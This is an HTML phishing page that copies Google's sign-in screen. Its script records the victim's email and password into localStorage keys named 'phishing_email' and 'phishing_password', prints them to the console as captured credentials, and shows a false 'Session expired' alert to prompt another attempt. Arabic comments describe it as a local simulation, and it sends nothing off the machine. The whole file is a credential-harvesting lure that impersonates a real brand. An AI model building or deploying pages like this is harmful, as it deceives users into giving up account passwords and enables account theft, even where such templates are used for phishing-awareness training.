<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Sign in - Google Accounts</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f1f3f4;
        }

        .container {
            width: 350px;
            margin: 100px auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo {
            font-size: 24px;
            color: #4285F4;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-top: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 10px;
            margin-top: 20px;
            background: #4285F4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background: #3367d6;
        }

        .footer {
            font-size: 12px;
            margin-top: 15px;
            color: gray;
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="logo">Google</div>
        <h3>Sign in</h3>

        <form onsubmit="saveData(event)">
            <input type="text" id="email" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>

        <div class="footer">
            Not your computer? Use Guest mode to sign in privately.
        </div>
    </div>

    <script>
        function saveData(event) {
            event.preventDefault();

            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;

            // حفظ البيانات locally (Simulation فقط)
            localStorage.setItem("phishing_email", email);
            localStorage.setItem("phishing_password", password);

            // عرض رسالة للمستخدم
            alert("Session expired. Please try again.");

            // طباعة في console (Evidence)
            console.log("Captured Email:", email);
            console.log("Captured Password:", password);
        }
    </script>

</body>

</html>
